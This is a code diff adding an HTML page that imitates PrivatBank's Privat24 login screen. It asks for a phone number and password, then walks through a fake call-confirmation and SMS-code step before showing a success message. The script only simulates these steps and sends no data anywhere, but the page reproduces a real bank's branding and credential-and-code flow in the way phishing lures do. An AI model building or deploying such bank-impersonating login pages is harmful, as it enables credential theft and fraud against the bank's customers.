@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ПриватБанк - Вхід</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1e5799 0%, #2ce0d9 50%, #2ce05e 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .login-container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+            width: 350px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo {
+            width: 180px;
+            margin-bottom: 10px;
+            transition: all 0.3s;
+        }
+
+        .call-logo {
+            width: 120px;
+            margin: 20px auto;
+            display: none;
+        }
+
+        .banking-title {
+            color: #333;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        .login-btn {
+            background: linear-gradient(to right, #2ce05e, #2ce0d9);
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(to right, #25c753, #25c7c7);
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .links {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .links a {
+            color: #2ce05e;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2ce05e;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-message {
+            margin: 20px 0;
+            font-weight: bold;
+            display: none;
+        }
+
+        .call-confirmation {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .call-btn {
+            background: #2ce05e;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+        }
+
+        .status-icon {
+            font-size: 60px;
+            margin: 20px 0;
+        }
+
+        .success {
+            color: #2ce05e;
+        }
+
+        .error {
+            color: #e74c3c;
+        }
+
+        .phone-animation {
+            animation: pulse 1.5s infinite;
+        }
+
+        .code-display {
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 5px;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f5f5f5;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .sms-confirmation {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .code-input {
+            font-size: 24px;
+            letter-spacing: 10px;
+            text-align: center;
+            width: 100%;
+            padding: 10px;
+            margin: 15px 0;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="privat.png" alt="Логотип банку" class="logo" id="mainLogo">
+        <img src="callprivat.png" alt="Дзвінок" class="logo call-logo phone-animation" id="callLogo">
+        <div class="banking-title">Вхід в Приват24</div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="phone">Номер телефону</label>
+                <input type="tel" id="phone" placeholder="+380 XX XXX XX XX" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="Введіть пароль" required>
+            </div>
+
+            <button type="submit" class="login-btn" id="submitBtn">Увійти</button>
+        </form>
+
+        <div class="loader" id="loader"></div>
+        <div class="status-message" id="statusMessage"></div>
+
+        <div class="call-confirmation" id="callConfirmation">
+            <h3>Підтвердження дзвінком</h3>
+            <p>Ми зателефонуємо вам на номер<br><strong id="displayPhone"></strong></p>
+            <p>Час очікування: <span id="countdown">120</span> сек</p>
+
+            <button class="call-btn" id="confirmCallBtn">Я відповів на дзвінок</button>
+        </div>
+
+        <div class="sms-confirmation" id="smsConfirmation">
+            <h3>Підтвердження SMS</h3>
+            <p>На ваш номер <strong id="smsPhoneNumber"></strong> було відправлено SMS з кодом підтвердження.</p>
+            <p>Введіть будь-який 3-значний код:</p>
+            <input type="text" id="smsCodeInput" class="code-input" maxlength="3" placeholder="XXX" pattern="\d{3}" title="Будь ласка, введіть 3 цифри">
+            <p>Час дії коду: <span id="smsCountdown">60</span> сек</p>
+        </div>
+
+        <div class="status-icon" id="statusIcon"></div>
+
+        <div class="links">
+            <a href="#">Забули пароль?</a> |
+            <a href="#">Реєстрація</a>
+        </div>
+    </div>
+
+    <script>
+        // Настройки логотипов - можно легко изменить
+        const logoConfig = {
+            mainLogo: 'privat.png',       // Путь к основному логотипу
+            callLogo: 'callpivatt.png'    // Путь к логотипу звонка
+        };
+
+        // Устанавливаем логотипы при загрузке страницы
+        document.getElementById('mainLogo').src = logoConfig.mainLogo;
+        document.getElementById('callLogo').src = logoConfig.callLogo;
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phoneNumber = document.getElementById('phone').value;
+
+            // Показуємо завантажувач
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+
+            // Симулюємо завантаження 3 секунды
+            setTimeout(function() {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('mainLogo').style.display = 'none';
+                document.getElementById('callLogo').style.display = 'block';
+                document.getElementById('callConfirmation').style.display = 'block';
+                document.getElementById('displayPhone').textContent = phoneNumber;
+
+                // Запускаємо таймер на 2 хвилины
+                let timeLeft = 120;
+                const countdown = document.getElementById('countdown');
+                const countdownInterval = setInterval(function() {
+                    timeLeft--;
+                    countdown.textContent = timeLeft;
+
+                    if (timeLeft <= 0) {
+                        clearInterval(countdownInterval);
+                        showConfirmationResult(false);
+                    }
+                }, 1000);
+
+                // Обробник підтвердження дзвінка
+                document.getElementById('confirmCallBtn').addEventListener('click', function() {
+                    clearInterval(countdownInterval);
+                    showSmsConfirmation(phoneNumber);
+                });
+            }, 3000);
+        });
+
+        function showSmsConfirmation(phoneNumber) {
+            document.getElementById('callConfirmation').style.display = 'none';
+            document.getElementById('callLogo').style.display = 'none';
+
+            document.getElementById('smsPhoneNumber').textContent = phoneNumber;
+            document.getElementById('smsConfirmation').style.display = 'block';
+
+            // Таймер для SMS кода (60 секунд)
+            let smsTimeLeft = 60;
+            const smsCountdown = document.getElementById('smsCountdown');
+            const smsCountdownInterval = setInterval(function() {
+                smsTimeLeft--;
+                smsCountdown.textContent = smsTimeLeft;
+
+                if (smsTimeLeft <= 0) {
+                    clearInterval(smsCountdownInterval);
+                    showConfirmationResult(false);
+                }
+            }, 1000);
+
+            // Обработка ввода кода
+            const smsCodeInput = document.getElementById('smsCodeInput');
+            smsCodeInput.focus();
+
+            smsCodeInput.addEventListener('input', function() {
+                if (this.value.length === 3) {
+                    clearInterval(smsCountdownInterval);
+                    showConfirmationResult(true);
+                }
+            });
+        }
+
+        function showConfirmationResult(success) {
+            document.getElementById('callConfirmation').style.display = 'none';
+            document.getElementById('smsConfirmation').style.display = 'none';
+            document.getElementById('callLogo').style.display = 'none';
+
+            const statusIcon = document.getElementById('statusIcon');
+            const statusMessage = document.getElementById('statusMessage');
+
+            if (success) {
+                statusIcon.innerHTML = '✓';
+                statusIcon.className = 'status-icon success';
+                statusMessage.textContent = 'Код підтверджено! Ви успішно увійшли в систему.';
+                document.getElementById('mainLogo').style.display = 'block';
+                document.getElementById('mainLogo').style.filter = 'hue-rotate(120deg)';
+            } else {
+                statusIcon.innerHTML = '✗';
+                statusIcon.className = 'status-icon error';
+                statusMessage.textContent = 'Час дії коду минув. Спробуйте ще раз.';
+                document.getElementById('mainLogo').style.display = 'block';
+                document.getElementById('mainLogo').style.filter = 'grayscale(100%) brightness(40%) sepia(100%) hue-rotate(-50deg) saturate(600%) contrast(0.8)';
+            }
+
+            statusIcon.style.display = 'block';
+            statusMessage.style.display = 'block';
+
+            // Кнопка "Спробувати знову"
+            const tryAgainBtn = document.createElement('button');
+            tryAgainBtn.className = 'login-btn';
+            tryAgainBtn.textContent = 'Спробувати знову';
+            tryAgainBtn.style.marginTop = '20px';
+            tryAgainBtn.onclick = function() {
+                location.reload();
+            };
+
+            document.querySelector('.login-container').appendChild(tryAgainBtn);
+        }
+    </script>
+</body>
+</html>
